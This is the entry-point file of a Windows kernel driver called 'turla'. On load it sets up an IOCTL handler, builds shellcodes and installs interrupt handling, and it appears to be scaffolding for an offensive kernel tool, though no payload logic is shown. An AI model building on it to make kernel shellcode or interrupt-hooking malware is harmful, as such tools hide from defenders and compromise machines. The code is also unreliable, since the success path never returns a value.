#include "driver/ioctl/ioctl.hpp"
#include "driver/interrupts/interrupts.h"
#include "driver/interrupts/shellcode.hpp"

auto driver_entry( PDRIVER_OBJECT drv, PUNICODE_STRING rp ) -> long
{
	DbgPrint("entering turla...");

    auto ioctl_stat = []() -> NTSTATUS
    {
        return !turla_drv->initialize() ? STATUS_FAILED_DRIVER_ENTRY : STATUS_SUCCESS;
    }();

    auto shellcode_stat = []() -> project_status
    {
        return !turla_shellcode->construct_shellcodes() ? status_memory_alloc_failure : status_success;
    }();

    auto interrupt_stat = []() -> project_status
    {
        return !turla_interrupts->initialize() ? status_failure : status_success;
    }();

    if(ioctl_stat == STATUS_FAILED_DRIVER_ENTRY || shellcode_stat == status_memory_alloc_failure || interrupt_stat == status_failure)
	    return STATUS_FAILED_DRIVER_ENTRY;
}
